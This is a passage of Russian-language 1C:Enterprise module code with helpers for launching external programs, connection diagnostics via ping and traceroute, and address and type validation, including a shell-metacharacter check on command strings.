		// Для MacOS просто запускаем команду.
		// Параметр ПараметрыЗапускаПрограммы.ВыполнитьСНаивысшимиПравами игнорируется.
		ЗапуститьПриложение(СтрокаКоманды, ТекущийКаталог, ДождатьсяЗавершения, КодВозврата);
		
	КонецЕсли;
	
	// Переопределение возвращенного оболочной значения.
	Если КодВозврата = Неопределено Тогда 
		КодВозврата = 0;
	КонецЕсли;
	
	ПотокВывода = """";
	ПотокОшибок = """";
	
	Если ДождатьсяЗавершения Тогда 
		
		Если ПолучитьПотокВывода Тогда
			
			ФайлИнфо = Новый Файл(ФайлПотокаВывода);
			Если ФайлИнфо.Существует() Тогда 
				ЧтениеПотокаВывода = Новый ЧтениеТекста(ФайлПотокаВывода, КодировкаСтандартныхПотоков()); 
				ПотокВывода = ЧтениеПотокаВывода.Прочитать();
				ЧтениеПотокаВывода.Закрыть();
				УдалитьВременныйФайл(ФайлПотокаВывода);
			КонецЕсли;
			
			Если ПотокВывода = Неопределено Тогда 
				ПотокВывода = """";
			КонецЕсли;
			
		КонецЕсли;
		
		Если ПолучитьПотокОшибок Тогда 
			
			ФайлИнфо = Новый Файл(ФайлПотокаОшибок);
			Если ФайлИнфо.Существует() Тогда 
				ЧтениеПотокаОшибок = Новый ЧтениеТекста(ФайлПотокаОшибок, КодировкаСтандартныхПотоков());
				ПотокОшибок = ЧтениеПотокаОшибок.Прочитать();
				ЧтениеПотокаОшибок.Закрыть();
				УдалитьВременныйФайл(ФайлПотокаОшибок);
			КонецЕсли;
			
			Если ПотокОшибок = Неопределено Тогда 
				ПотокОшибок = """";
			КонецЕсли;
			
		КонецЕсли;
		
	КонецЕсли;
	
	Результат = Новый Структура;
	Результат.Вставить(""КодВозврата"", КодВозврата);
	Результат.Вставить(""ПотокВывода"", ПотокВывода);
	Результат.Вставить(""ПотокОшибок"", ПотокОшибок);
	
	Возврат Результат;
	
#КонецЕсли
	
КонецФункции

// Запускает диагностику сетевого ресурса.
// Не доступно в веб-клиенте.
// В модели сервиса функциональность ограничена получением описания ошибки.
//
// Параметры:
//  URL - Строка - адрес URL ресурса, диагностику которого надо выполнить.
//
// Возвращаемое значение:
//  Структура - Результат работы программы.
//      ОписаниеОшибки    - Строка - краткое описание ошибки.
//      ЖурналДиагностики - Строка - подробный журнал диагностики с техническими подробностями.
//
// Пример:
//	// Диагностика веб-сервиса адресного классификатора.
//	Результат = ОбщегоНазначенияКлиентСервер.ДиагностикаСоединения(""https://api.orgaddress.1c.ru/orgaddress/v1?wsdl"");
//	
//	ОписаниеОшибки    = Результат.ОписаниеОшибки;
//	ЖурналДиагностики = Результат.ЖурналДиагностики;
//
Функция ДиагностикаСоединения(URL) Экспорт
	
#Если ВебКлиент Тогда
	ВызватьИсключение НСтр(""ru = 'Выполнение диагностики соединения недоступно в веб-клиенте.'"");
#Иначе
	
	Описание = Новый Массив;
	Описание.Добавить(СтроковыеФункцииКлиентСервер.ПодставитьПараметрыВСтроку(
		НСтр(""ru = 'При обращении по URL: %1'""), 
		URL));
	Описание.Добавить(ПредставлениеМестаДиагностики());
	
#Если Сервер Или ТолстыйКлиентОбычноеПриложение Или ВнешнееСоединение Тогда
	Если ОбщегоНазначения.РазделениеВключено() Тогда
		Описание.Добавить(
			НСтр(""ru = 'Обратитесь к администратору.'""));
		
		ОписаниеОшибки = СтрСоединить(Описание, Символы.ПС);
		
		Результат = Новый Структура;
		Результат.Вставить(""ОписаниеОшибки"", ОписаниеОшибки);
		Результат.Вставить(""ЖурналДиагностики"", """");
		
		Возврат Результат;
	КонецЕсли;
#КонецЕсли
	
	Журнал = Новый Массив;
	Журнал.Добавить(
		НСтр(""ru = 'Журнал диагностики:
		           |Выполняется проверка доступности сервера.
		           |Описание диагностируемой ошибки см. в следующем сообщении журнала.'""));
	Журнал.Добавить();
	
	СоединениеЧерезПрокси = Ложь;
	
#Если Сервер Или ТолстыйКлиентОбычноеПриложение Или ВнешнееСоединение Тогда
	Если ОбщегоНазначения.ПодсистемаСуществует(""СтандартныеПодсистемы.ПолучениеФайловИзИнтернета"") Тогда
		МодульПолучениеФайловИзИнтернетаКлиентСервер = 
			ОбщегоНазначения.ОбщийМодуль(""ПолучениеФайловИзИнтернетаКлиентСервер"");
		СостояниеНастроекПрокси = МодульПолучениеФайловИзИнтернетаКлиентСервер.СостояниеНастроекПрокси();
		
		СоединениеЧерезПрокси = СостояниеНастроекПрокси.СоединениеЧерезПрокси;
		
		Журнал.Добавить(СостояниеНастроекПрокси.Представление);
	КонецЕсли;
#Иначе
	Если ОбщегоНазначенияКлиент.ПодсистемаСуществует(""СтандартныеПодсистемы.ПолучениеФайловИзИнтернета"") Тогда
		МодульПолучениеФайловИзИнтернетаКлиентСервер = 
			ОбщегоНазначенияКлиент.ОбщийМодуль(""ПолучениеФайловИзИнтернетаКлиентСервер"");
		СостояниеНастроекПрокси = МодульПолучениеФайловИзИнтернетаКлиентСервер.СостояниеНастроекПрокси();
		
		СоединениеЧерезПрокси = СостояниеНастроекПрокси.СоединениеЧерезПрокси;
		
		Журнал.Добавить(СостояниеНастроекПрокси.Представление);
	КонецЕсли;
#КонецЕсли
	
	Если СоединениеЧерезПрокси Тогда 
		
		Описание.Добавить(
			НСтр(""ru = 'Диагностика соединения не выполнена, т.к. настроен прокси-сервер.
			           |Обратитесь к администратору.'""));
		
	Иначе 
		
		СтруктураСсылки = СтруктураURI(URL);
		АдресСервераРесурса = СтруктураСсылки.Хост;
		АдресСервераКонтрольнойПроверки = ""1c.com"";
		
		РезультатДоступностиРесурса = ПроверитьДоступностьСервера(АдресСервераРесурса);
		
		Журнал.Добавить();
		Журнал.Добавить(""1) "" + РезультатДоступностиРесурса.ЖурналДиагностики);
		
		Если РезультатДоступностиРесурса.Доступен Тогда 
			
			Описание.Добавить(СтроковыеФункцииКлиентСервер.ПодставитьПараметрыВСтроку(
				НСтр(""ru = 'Выполнено обращение к несуществующему ресурсу на сервере %1
				           |или возникли неполадки на удаленном сервере.'""),
				АдресСервераРесурса));
			
		Иначе 
			
			РезультатКонтрольнойПроверки = ПроверитьДоступностьСервера(АдресСервераКонтрольнойПроверки);
			Журнал.Добавить(""2) "" + РезультатКонтрольнойПроверки.ЖурналДиагностики);
			
			Если Не РезультатКонтрольнойПроверки.Доступен Тогда
				
				Описание.Добавить(
					НСтр(""ru = 'Отсутствует доступ в сеть интернет по причине:
					           |- компьютер не подключен к интернету;
					           |- неполадки у интернет-провайдера;
					           |- подключение к интернету блокирует межсетевой экран, 
					           |  антивирусная программа или другое программное обеспечение.'""));
				
			Иначе 
				
				Описание.Добавить(СтроковыеФункцииКлиентСервер.ПодставитьПараметрыВСтроку(
					НСтр(""ru = 'Сервер %1 не доступен по причине:
					           |- неполадки у интернет-провайдера;
					           |- подключение к серверу блокирует межсетевой экран, 
					           |  антивирусная программа или другое программное обеспечение;
					           |- сервер отключен или на техническом обслуживании.'""),
					АдресСервераРесурса));
				
				ЖурналТрассировки = ЖурналТрассировкиМаршрутаСервера(АдресСервераРесурса);
				Журнал.Добавить(""3) "" + ЖурналТрассировки);
				
			КонецЕсли;
			
		КонецЕсли;
		
	КонецЕсли;
	
	ОписаниеОшибки = СтрСоединить(Описание, Символы.ПС);
	
	Журнал.Вставить(0);
	Журнал.Вставить(0, ОписаниеОшибки);
	
	ЖурналДиагностики = СтрСоединить(Журнал, Символы.ПС);
	
#Если Сервер Или ТолстыйКлиентОбычноеПриложение Или ВнешнееСоединение Тогда
	ЗаписьЖурналаРегистрации(
		НСтр(""ru = 'Диагностика соединения'"", КодОсновногоЯзыка()),
		УровеньЖурналаРегистрации.Ошибка,,, ЖурналДиагностики);
#Иначе
	ЖурналРегистрацииКлиент.ДобавитьСообщениеДляЖурналаРегистрации(
		НСтр(""ru = 'Диагностика соединения'"", КодОсновногоЯзыка()),
		""Ошибка"", ЖурналДиагностики,, Истина);
#КонецЕсли
	
	Результат = Новый Структура;
	Результат.Вставить(""ОписаниеОшибки"", ОписаниеОшибки);
	Результат.Вставить(""ЖурналДиагностики"", ЖурналДиагностики);
	
	Возврат Результат;
	
#КонецЕсли
	
КонецФункции

// Создает объект описания защищенного соединения OpenSSL.
// Параметры:
//  СертификатКлиента - СертификатКлиентаФайл, 
//                      СертификатКлиентаWindows, 
//                      Неопределено - см ЗащищенноеСоединениеOpenSSL.
//  СертификатыУдостоверяющихЦентров - СертификатыУдостоверяющихЦентровФайл, 
//                                     СертификатыУдостоверяющихЦентровWindows, 
//                                     СертификатыУдостоверяющихЦентровLinux, 
//                                     СертификатыУдостоверяющихЦентровОС, 
//                                     Неопределено - см ЗащищенноеСоединениеOpenSSL.
//
// Возвращаемое значение:
//  ЗащищенноеСоединениеOpenSSL - описание защищенного соединения.
//
Функция НовоеЗащищенноеСоединение(СертификатКлиента = Неопределено, СертификатыУдостоверяющихЦентров = Неопределено) Экспорт
	
	Возврат Новый ЗащищенноеСоединениеOpenSSL(СертификатКлиента, СертификатыУдостоверяющихЦентров);
	
КонецФункции

#Область УстаревшиеПроцедурыИФункции

// Устарела. Следует использовать ОбщегоНазначенияКлиентСервер.РазностьМассивов
// Вычисляет разность массивов. Разностью массивов А и В является массив, содержащий
// все элементы массива А не существующие в массиве В.
//
// Параметры:
//  Массив - Массив - массив элементов, из которого необходимо выполнить вычитание;
//  МассивВычитания - Массив - массив элементов, который будет вычитаться.
// 
// Возвращаемое значение:
//  Массив - дополнение массива В до А.
//
Функция СократитьМассив(Массив, МассивВычитания) Экспорт
	
	Возврат РазностьМассивов(Массив, МассивВычитания);
	
КонецФункции

#КонецОбласти

#КонецОбласти

#Область СлужебныеПроцедурыИФункции

// Выполняет поиск элемента в коллекции: списке значений или массиве.
//
Функция НайтиВСписке(Список, Элемент)
	
	Перем ЭлементВСписке;
	
	Если ТипЗнч(Список) = Тип(""СписокЗначений"") Тогда
		Если ТипЗнч(Элемент) = Тип(""ЭлементСпискаЗначений"") Тогда
			ЭлементВСписке = Список.НайтиПоЗначению(Элемент.Значение);
		Иначе
			ЭлементВСписке = Список.НайтиПоЗначению(Элемент);
		КонецЕсли;
	КонецЕсли;
	
	Если ТипЗнч(Список) = Тип(""Массив"") Тогда
		ЭлементВСписке = Список.Найти(Элемент);
	КонецЕсли;
	
	Возврат ЭлементВСписке;
	
КонецФункции

// Проверяет, что почтовый адрес не содержит символов обрамления
// если символы обрамления вставлены правильно убирает их.
Функция ПроверитьИПодготовитьПочтовыйАдрес(Знач ПолноеИмяАдресата, Знач ПочтовыйАдрес)
	
	НедопустимыйСимволВИмениАдресата = НСтр(""ru = 'Недопустимый символ в имени адресата.'"");
	НедопустимыйСимволВПочтовомАдресе = НСтр(""ru = 'Недопустимый символ в почтовом адресе.'"");
	СимволыОбрамления = ""<>[]"";
	
	ПочтовыйАдрес     = СокрЛП(ПочтовыйАдрес);
	ПолноеИмяАдресата = СокрЛП(ПолноеИмяАдресата);
	
	Если СтрНачинаетсяС(ПолноеИмяАдресата, ""<"") Тогда
		Если СтрЗаканчиваетсяНа(ПолноеИмяАдресата, "">"") Тогда
			ПолноеИмяАдресата = Сред(ПолноеИмяАдресата, 2, СтрДлина(ПолноеИмяАдресата)-2);
		Иначе
			ВызватьИсключение НедопустимыйСимволВИмениАдресата;
		КонецЕсли;
	ИначеЕсли СтрНачинаетсяС(ПолноеИмяАдресата, ""["") Тогда
		Если СтрЗаканчиваетсяНа(ПолноеИмяАдресата, ""]"") Тогда
			ПолноеИмяАдресата = Сред(ПолноеИмяАдресата, 2, СтрДлина(ПолноеИмяАдресата)-2);
		Иначе
			ВызватьИсключение НедопустимыйСимволВИмениАдресата;
		КонецЕсли;
	КонецЕсли;
	
	Если СтрНачинаетсяС(ПочтовыйАдрес, ""<"") Тогда
		Если СтрЗаканчиваетсяНа(ПочтовыйАдрес, "">"") Тогда
			ПочтовыйАдрес = Сред(ПочтовыйАдрес, 2, СтрДлина(ПочтовыйАдрес)-2);
		Иначе
			ВызватьИсключение НедопустимыйСимволВПочтовомАдресе;
		КонецЕсли;
	ИначеЕсли СтрНачинаетсяС(ПочтовыйАдрес, ""["") Тогда
		Если СтрЗаканчиваетсяНа(ПочтовыйАдрес, ""]"") Тогда
			ПочтовыйАдрес = Сред(ПочтовыйАдрес, 2, СтрДлина(ПочтовыйАдрес)-2);
		Иначе
			ВызватьИсключение НедопустимыйСимволВПочтовомАдресе;
		КонецЕсли;
	КонецЕсли;
	
	Для Индекс = 1 По СтрДлина(СимволыОбрамления) Цикл
		Если СтрНайти(ПолноеИмяАдресата, Сред(СимволыОбрамления, Индекс, 1)) <> 0
		 ИЛИ СтрНайти(ПочтовыйАдрес,     Сред(СимволыОбрамления, Индекс, 1)) <> 0 Тогда
			ВызватьИсключение НедопустимыйСимволВПочтовомАдресе;
		КонецЕсли;
	КонецЦикла;
	
	Возврат Новый Структура(""Адрес, Представление"", ПочтовыйАдрес,ПолноеИмяАдресата);
	
КонецФункции

// Сдвигает маркер позиции пока встречается символ Символ
// возвращает номер позиции в строке, на которое установился маркер.
//
Функция ПропуститьПробелы(Знач Строка,
                          Знач ТекущийИндекс,
                          Знач ПропускаемыйСимвол)
	
	// Убираем лишние пробелы если они есть.
	Пока ТекущийИндекс < СтрДлина(Строка) Цикл
		Если Сред(Строка, ТекущийИндекс, 1) <> ПропускаемыйСимвол Тогда
			Возврат ТекущийИндекс;
		КонецЕсли;
		ТекущийИндекс = ТекущийИндекс + 1;
	КонецЦикла;
	
	Возврат ТекущийИндекс;
	
КонецФункции

Процедура НайтиРекурсивно(КоллекцияЭлементов, МассивЭлементов, СпособПоиска, ЗначениеПоиска)
	
	Для каждого ЭлементОтбора Из КоллекцияЭлементов Цикл
		
		Если ТипЗнч(ЭлементОтбора) = Тип(""ЭлементОтбораКомпоновкиДанных"") Тогда
			
			Если СпособПоиска = 1 Тогда
				Если ЭлементОтбора.ЛевоеЗначение = ЗначениеПоиска Тогда
					МассивЭлементов.Добавить(ЭлементОтбора);
				КонецЕсли;
			ИначеЕсли СпособПоиска = 2 Тогда
				Если ЭлементОтбора.Представление = ЗначениеПоиска Тогда
					МассивЭлементов.Добавить(ЭлементОтбора);
				КонецЕсли;
			КонецЕсли;
		Иначе
			
			НайтиРекурсивно(ЭлементОтбора.Элементы, МассивЭлементов, СпособПоиска, ЗначениеПоиска);
			
			Если СпособПоиска = 2 И ЭлементОтбора.Представление = ЗначениеПоиска Тогда
				МассивЭлементов.Добавить(ЭлементОтбора);
			КонецЕсли;
			
		КонецЕсли;
		
	КонецЦикла;
	
КонецПроцедуры

Функция ЗаменитьСимволыВСтрокеНаПробелы(Строка, ЗаменяемыеСимволы)
	Результат = Строка;
	Для Позиция = 1 По СтрДлина(Символы) Цикл
		Результат = СтрЗаменить(Результат, Сред(ЗаменяемыеСимволы, Позиция, 1), "" "");
	КонецЦикла;
	Возврат Результат;
КонецФункции

Функция ЕстьСимволыВНачалеВКонце(Строка, ПроверяемыеСимволы)
	Для Позиция = 1 По СтрДлина(ПроверяемыеСимволы) Цикл
		Символ = Сред(ПроверяемыеСимволы, Позиция, 1);
		СимволНайден = (Лев(Строка,1) = Символ) Или (Прав(Строка,1) = Символ);
		Если СимволНайден Тогда
			Возврат Истина;
		КонецЕсли;
	КонецЦикла;
	Возврат Ложь;
КонецФункции

Функция СтрокаСодержитТолькоДопустимыеСимволы(Строка, ДопустимыеСимволы)
	МассивСимволов = Новый Массив;
	Для Позиция = 1 По СтрДлина(ДопустимыеСимволы) Цикл
		МассивСимволов.Добавить(Сред(ДопустимыеСимволы,Позиция,1));
	КонецЦикла;
	
	Для Позиция = 1 По СтрДлина(Строка) Цикл
		Если МассивСимволов.Найти(Сред(Строка, Позиция, 1)) = Неопределено Тогда
			Возврат Ложь;
		КонецЕсли;
	КонецЦикла;
	
	Возврат Истина;
КонецФункции

Функция ЗначениеОжидаемогоТипа(Значение, ОжидаемыеТипы)
	ТипЗначения = ТипЗнч(Значение);
	Если ТипЗнч(ОжидаемыеТипы) = Тип(""ОписаниеТипов"") Тогда
		Возврат ОжидаемыеТипы.Типы().Найти(ТипЗначения) <> Неопределено;
	ИначеЕсли ТипЗнч(ОжидаемыеТипы) = Тип(""Тип"") Тогда
		Возврат ТипЗначения = ОжидаемыеТипы;
	ИначеЕсли ТипЗнч(ОжидаемыеТипы) = Тип(""Массив"") Или ТипЗнч(ОжидаемыеТипы) = Тип(""ФиксированныйМассив"") Тогда
		Возврат ОжидаемыеТипы.Найти(ТипЗначения) <> Неопределено;
	ИначеЕсли ТипЗнч(ОжидаемыеТипы) = Тип(""Соответствие"") Или ТипЗнч(ОжидаемыеТипы) = Тип(""ФиксированноеСоответствие"") Тогда
		Возврат ОжидаемыеТипы.Получить(ТипЗначения) <> Неопределено;
	КонецЕсли;
	Возврат Неопределено;
КонецФункции

Функция ПредставлениеТипов(ОжидаемыеТипы)
	Если ТипЗнч(ОжидаемыеТипы) = Тип(""Массив"") Тогда
		Результат = """";
		Индекс = 0;
		Для Каждого Тип Из ОжидаемыеТипы Цикл
			Если Не ПустаяСтрока(Результат) Тогда
				Результат = Результат + "", "";
			КонецЕсли;
			Результат = Результат + ПредставлениеТипа(Тип);
			Индекс = Индекс + 1;
			Если Индекс > 10 Тогда
				Результат = Результат + "",... ""
					+ СтроковыеФункцииКлиентСервер.ПодставитьПараметрыВСтроку(НСтр(""ru='(всего %1 типов)'""), ОжидаемыеТипы.Количество());
				Прервать;	
			КонецЕсли;	
		КонецЦикла;
		Возврат Результат;
	Иначе
		Возврат ПредставлениеТипа(ОжидаемыеТипы);
	КонецЕсли;
КонецФункции

Функция ПредставлениеТипа(Тип)
	Если Тип = Неопределено Тогда
		Возврат ""Неопределено"";
	ИначеЕсли ТипЗнч(Тип) = Тип(""ОписаниеТипов"") Тогда
		ТипСтрокой = Строка(Тип);
		Возврат ?(СтрДлина(ТипСтрокой) > 150, Лев(ТипСтрокой, 150) + ""..."" 
			+ СтроковыеФункцииКлиентСервер.ПодставитьПараметрыВСтроку(НСтр(""ru='(всего %1 типов)'""), Тип.Типы().Количество()), 
			ТипСтрокой);
	Иначе	
		ТипСтрокой = Строка(Тип);
		Возврат ?(СтрДлина(ТипСтрокой) > 150, Лев(ТипСтрокой, 150) + ""..."", ТипСтрокой);
	КонецЕсли;	
КонецФункции	

Функция МаксимальноеЗначениеВМассиве(Массив)
	
	МаксимальноеЗначение = 0;
	
	Для Индекс = 0 По Массив.Количество() - 1 Цикл
		Значение = Массив[Индекс];
		
		Если МаксимальноеЗначение < Значение Тогда
			МаксимальноеЗначение = Значение;
		КонецЕсли;
	КонецЦикла;
	
	Возврат МаксимальноеЗначение;
	
КонецФункции

Функция БезопаснаяСтрокаКоманды(КомандаЗапуска) Экспорт
	
	Результат = """";
	
	Если ТипЗнч(КомандаЗапуска) = Тип(""Строка"") Тогда 
		Если СодержитНебезопасныеДействия(КомандаЗапуска) Тогда 
			ВызватьИсключение СтроковыеФункцииКлиентСервер.ПодставитьПараметрыВСтроку(
				НСтр(""ru = 'Недопустимая строка команды
				           |%1
				           |по причине:
				           |Строка команды не должна содержать символы: """"$"""", """"`"""", """"|"""", """";"""", """"&"""".'""),
				КомандаЗапуска);
		КонецЕсли;
		
		Результат = КомандаЗапуска;
	ИначеЕсли ТипЗнч(КомандаЗапуска) = Тип(""Массив"") Тогда
		Если КомандаЗапуска.Количество() > 0 Тогда 
			Если СодержитНебезопасныеДействия(КомандаЗапуска[0]) Тогда
				ВызватьИсключение СтроковыеФункцииКлиентСервер.ПодставитьПараметрыВСтроку(
				НСтр(""ru = 'Недопустимая команда или путь к исполняемому файлу
				           |%1
				           |по причине:
				           |Команды не должна содержать символы: """"$"""", """"`"""", """"|"""", """";"""", """"&"""".'""),
				КомандаЗапуска[0]);
			КонецЕсли;
			Результат = МассивВСтрокуКоманды(КомандаЗапуска);
		Иначе
			ВызватьИсключение
				НСтр(""ru = 'Ожидался что в первый элемент КомандаЗапуска будет командой или путем к исполняемому файлу.'"");
		КонецЕсли;
	Иначе 
		ВызватьИсключение 
			НСтр(""ru = 'Ожидался что значение КомандаЗапуска будет <Строка> или <Массив>'"");
	КонецЕсли;
		
	Возврат Результат
	
КонецФункции

Функция СодержитНебезопасныеДействия(Знач СтрокаКоманды)
	
	СтрокаКоманды = СтрЗаменить(СтрокаКоманды, ""$DISPLAY"", """");
	СтрокаКоманды = СтрЗаменить(СтрокаКоманды, ""$XAUTHORITY"", """");
	
	Возврат СтрНайти(СтрокаКоманды, ""$"") <> 0
		Или СтрНайти(СтрокаКоманды, ""`"") <> 0
		Или СтрНайти(СтрокаКоманды, ""|"") <> 0
		Или СтрНайти(СтрокаКоманды, "";"") <> 0
		Или СтрНайти(СтрокаКоманды, ""&"") <> 0;
	
КонецФункции

Функция МассивВСтрокуКоманды(КомандаЗапуска)
	
	Результат = Новый Массив;
	НужныКавычки = Ложь;
	Для Каждого Аргумент Из КомандаЗапуска Цикл
		
		Если Результат.Количество() > 0 Тогда 
			Результат.Добавить("" "")
		КонецЕсли;
		
		НужныКавычки = Аргумент = Неопределено
			Или ПустаяСтрока(Аргумент)
			Или СтрНайти(Аргумент, "" "")
			Или СтрНайти(Аргумент, Символы.Таб)
			Или СтрНайти(Аргумент, ""&"")
			Или СтрНайти(Аргумент, ""("")
			Или СтрНайти(Аргумент, "")"")
			Или СтрНайти(Аргумент, ""["")
			Или СтрНайти(Аргумент, ""]"")
			Или СтрНайти(Аргумент, ""{"")
			Или СтрНайти(Аргумент, ""}"")
			Или СтрНайти(Аргумент, ""^"")
			Или СтрНайти(Аргумент, ""="")
			Или СтрНайти(Аргумент, "";"")
			Или СтрНайти(Аргумент, ""!"")
			Или СтрНайти(Аргумент, ""'"")
			Или СтрНайти(Аргумент, ""+"")
			Или СтрНайти(Аргумент, "","")
			Или СтрНайти(Аргумент, ""`"")
			Или СтрНайти(Аргумент, ""~"")
			Или СтрНайти(Аргумент, ""$"")
			Или СтрНайти(Аргумент, ""|"");
		
		Если НужныКавычки Тогда 
			Результат.Добавить("""""""");
		КонецЕсли;
		
		Результат.Добавить(СтрЗаменить(Аргумент, """""""", """"""""""""));
		
		Если НужныКавычки Тогда 
			Результат.Добавить("""""""");
		КонецЕсли;
		
	КонецЦикла;
	
	Возврат СтрСоединить(Результат);
	
КонецФункции

Функция ТекстОшибкиПредопределенноеЗначениеНеНайдено(ПолноеИмяПредопределенного)
	
	Возврат СтроковыеФункцииКлиентСервер.ПодставитьПараметрыВСтроку(
		НСтр(""ru = 'Предопределенное значение """"%1"""" не найдено.'""), ПолноеИмяПредопределенного);
	
КонецФункции

#Если Не ВебКлиент Тогда

// Возвращает кодировку стандартных поток вывода и ошибок, используемую в текущей ОС.
//
// Возвращаемое значение:
//  КодировкаТекста - кодировка стандартных потоков вывода и ошибок.
//
Функция КодировкаСтандартныхПотоков()
	
	СистемнаяИнформация = Новый СистемнаяИнформация();
	Если (СистемнаяИнформация.ТипПлатформы = ТипПлатформы.Windows_x86) 
		Или (СистемнаяИнформация.ТипПлатформы = ТипПлатформы.Windows_x86_64) Тогда
		
		Кодировка = КодировкаТекста.OEM;
	Иначе
		Кодировка = КодировкаТекста.Системная;
	КонецЕсли;
	
	Возврат Кодировка;
	
КонецФункции

Процедура УдалитьВременныйФайл(ПолноеИмяФайла)
	
	Если ПустаяСтрока(ПолноеИмяФайла) Тогда
		Возврат;
	КонецЕсли;
		
	Попытка
		УдалитьФайлы(ПолноеИмяФайла);
	Исключение
#Если Сервер Тогда
		ЗаписьЖурналаРегистрации(НСтр(""ru = 'Базовая функциональность'"", КодОсновногоЯзыка()),
			УровеньЖурналаРегистрации.Предупреждение,,, 
			СтроковыеФункцииКлиентСервер.ПодставитьПараметрыВСтроку(
				НСтр(""ru = 'Не удалось удалить временный файл
				           |%1 по причине: %2'""), 
				ПолноеИмяФайла, 
				КраткоеПредставлениеОшибки(ИнформацияОбОшибке())));
#КонецЕсли
	КонецПопытки;
	
КонецПроцедуры

Функция ПредставлениеМестаДиагностики()
	
#Если Сервер Или ТолстыйКлиентОбычноеПриложение Или ВнешнееСоединение Тогда
	Если ОбщегоНазначения.РазделениеВключено() Тогда
		Возврат НСтр(""ru = 'Подключение проводится на сервере 1С:Предприятия в интернете.'"");
	Иначе 
		Если ОбщегоНазначения.ИнформационнаяБазаФайловая() Тогда
			Если КлиентПодключенЧерезВебСервер() Тогда 
				Возврат СтроковыеФункцииКлиентСервер.ПодставитьПараметрыВСтроку(
					НСтр(""ru = 'Подключение проводится из файловой базы на веб-сервере <%1>.'""), ИмяКомпьютера());
			Иначе 
				Возврат СтроковыеФункцииКлиентСервер.ПодставитьПараметрыВСтроку(
					НСтр(""ru = 'Подключение проводится из файловой базы на компьютере <%1>.'""), ИмяКомпьютера());
			КонецЕсли;
		Иначе
			Возврат СтроковыеФункцииКлиентСервер.ПодставитьПараметрыВСтроку(
				НСтр(""ru = 'Подключение проводится на сервере 1С:Предприятие <%1>.'""), ИмяКомпьютера());
		КонецЕсли;
	КонецЕсли;
#Иначе 
	Возврат СтроковыеФункцииКлиентСервер.ПодставитьПараметрыВСтроку(
		НСтр(""ru = 'Подключение проводится на компьютере (клиенте) <%1>.'""), ИмяКомпьютера());
#КонецЕсли
	
КонецФункции

Функция ПроверитьДоступностьСервера(АдресСервера)
	
	ПараметрыЗапускаПрограммы = ПараметрыЗапускаПрограммы();
	ПараметрыЗапускаПрограммы.ДождатьсяЗавершения = Истина;
	ПараметрыЗапускаПрограммы.ПолучитьПотокВывода = Истина;
	ПараметрыЗапускаПрограммы.ПолучитьПотокОшибок = Истина;
	
	СистемнаяИнформация = Новый СистемнаяИнформация();
	ЭтоWindows = (СистемнаяИнформация.ТипПлатформы = ТипПлатформы.Windows_x86) 
		Или (СистемнаяИнформация.ТипПлатформы = ТипПлатформы.Windows_x86_64);
		
	Если ЭтоWindows Тогда
		ШаблонКоманды = ""ping %1 -n 2 -w 500"";
	Иначе
		ШаблонКоманды = ""ping -c 2 -w 500 %1"";
	КонецЕсли;
	
	СтрокаКоманды = СтроковыеФункцииКлиентСервер.ПодставитьПараметрыВСтроку(ШаблонКоманды, АдресСервера);
	
	Результат = ЗапуститьПрограмму(СтрокаКоманды, ПараметрыЗапускаПрограммы);
	
	// Разные операционные системы могут выводить ошибки в разные потоки:
	// - для Windows все всегда в потоке вывода;
	// - для Debian или RHEL ошибки падают в поток ошибок.
	ЖурналДоступности = Результат.ПотокВывода + Результат.ПотокОшибок;
	
	Если ЭтоWindows Тогда
		ФактНедоступности = (СтрНайти(ЖурналДоступности, ""Заданный узел недоступен"") > 0)
			Или (СтрНайти(ЖурналДоступности, ""Destination host unreachable"") > 0);
		
		БезПотерь = (СтрНайти(ЖурналДоступности, ""(0% потерь)"") > 0)
			Или (СтрНайти(ЖурналДоступности, ""(0% loss)"") > 0);
	Иначе 
		ФактНедоступности = (СтрНайти(ЖурналДоступности, ""Destination Host Unreachable"") > 0);
		БезПотерь = (СтрНайти(ЖурналДоступности, ""0% packet loss"") > 0)
	КонецЕсли;
	
	Доступен = Не ФактНедоступности И БезПотерь;
	СостояниеДоступности = ?(Доступен, НСтр(""ru = 'доступен'""), НСтр(""ru = 'не доступен'""));
	
	Журнал = Новый Массив;
	Журнал.Добавить(СтроковыеФункцииКлиентСервер.ПодставитьПараметрыВСтроку(
		НСтр(""ru = 'Удаленный сервер %1 %2:'""), 
		АдресСервера, 
		СостояниеДоступности));
	
	Журнал.Добавить(""> "" + СтрокаКоманды);
	Журнал.Добавить(ЖурналДоступности);
	
	Возврат Новый Структура(""Доступен, ЖурналДиагностики"", Доступен, СтрСоединить(Журнал, Символы.ПС));
	
КонецФункции

Функция ЖурналТрассировкиМаршрутаСервера(АдресСервера)
	
	ПараметрыЗапускаПрограммы = ПараметрыЗапускаПрограммы();
	ПараметрыЗапускаПрограммы.ДождатьсяЗавершения = Истина;
	ПараметрыЗапускаПрограммы.ПолучитьПотокВывода = Истина;
	ПараметрыЗапускаПрограммы.ПолучитьПотокОшибок = Истина;
	
	СистемнаяИнформация = Новый СистемнаяИнформация();
	ЭтоWindows = (СистемнаяИнформация.ТипПлатформы = ТипПлатформы.Windows_x86) 
		Или (СистемнаяИнформация.ТипПлатформы = ТипПлатформы.Windows_x86_64);
	
	Если ЭтоWindows Тогда
		ШаблонКоманды = ""tracert -w 100 -h 15 %1"";
	Иначе 
		// Если вдруг пакет traceroute не установлен - в потоке вывода будет ошибка.
		// Т.к. результат все равно не разбирается, на поток вывода можно не обращать внимания.
		// По нему администратор поймет что ему надо доставить.
		ШаблонКоманды = ""traceroute -w 100 -m 100 %1"";
	КонецЕсли;
	
	СтрокаКоманды = СтроковыеФункцииКлиентСервер.ПодставитьПараметрыВСтроку(ШаблонКоманды, АдресСервера);
	
	Результат = ЗапуститьПрограмму(СтрокаКоманды, ПараметрыЗапускаПрограммы);
	
	Журнал = Новый Массив;
	Журнал.Добавить(СтроковыеФункцииКлиентСервер.ПодставитьПараметрыВСтроку(
		НСтр(""ru = 'Трассировка маршрута к удаленному серверу %1:'""), АдресСервера));
	
	Журнал.Добавить(""> "" + СтрокаКоманды);
	Журнал.Добавить(Результат.ПотокВывода);
	Журнал.Добавить(Результат.ПотокОшибок);
	
	Возврат СтрСоединить(Журнал, Символы.ПС);
	
КонецФункции

#КонецЕсли

#КонецОбласти
"}
}
},
{11,
{"Табличный документ (печатные формы, ПФ)",1,0,"",""},
{0,
{"Вывод картинки (изображения) на печать, в макет (табличный документ)",0,0,"","//Вывод картинки (изображения) на печать, в макет (табличный документ)
//https://helpf.pro/faq/view/486.html

// 1-й вариант
//Как вывести картинку в табличный документ?

ТабДок = Новый ТабличныйДокумент; 
Макет = ОбработкаОбъект.ПолучитьМакет(""Макет""); 
